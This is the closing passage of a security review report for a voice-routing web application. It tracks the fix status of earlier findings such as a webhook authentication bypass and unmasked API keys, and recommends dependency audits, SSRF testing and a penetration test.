| Phase 3 (Medium) | 13 | 2-3 weeks |
| Phase 4 (Low) | 14 | Ongoing |

---

## Previously Identified Issues — Status Update

| Prior ID | Title | Previous Severity | Current Status |
|----------|-------|-------------------|----------------|
| Feb 2026 - Voice webhook auth bypass | Token verification incomplete | Critical | Partially Fixed (auth works, but rate limiting still missing per SR-9) |
| Feb 2026 - Wildcard token permissions | Tokens created with ['*'] | High | Fixed (role-scoped abilities now used) |
| Feb 2026 - Settings returns API keys | Unmasked keys in response | High | Fixed (masked keys via getMaskedDomainApiKey) |
| Feb 2026 - ALB fallback stubs | Hangup instead of routing | High | Fixed (fallbacks now delegate to VoiceRoutingManager) |
| Feb 2026 - Dual routing architecture | Two competing call paths | Critical | Partially Fixed (VoiceRoutingController is canonical, but CloudonixWebhookController still processes) |

---

## Recommendations for Next Review

1. **Dependency monitoring:** Set up automated `composer audit` and `npm audit` in CI/CD pipeline
2. **SSRF deep dive:** After implementing webhook URL validation, conduct targeted SSRF testing
3. **Token migration:** If httpOnly cookie migration is implemented, conduct dedicated session security review
4. **Penetration testing:** Consider external penetration test focusing on webhook endpoints and multi-tenant isolation
5. **Go worker security:** Dedicated review of the dialer worker's Redis interactions and error handling

---

*Generated from SECURITY-REVIEW-WORKPLAN.md v1.0*
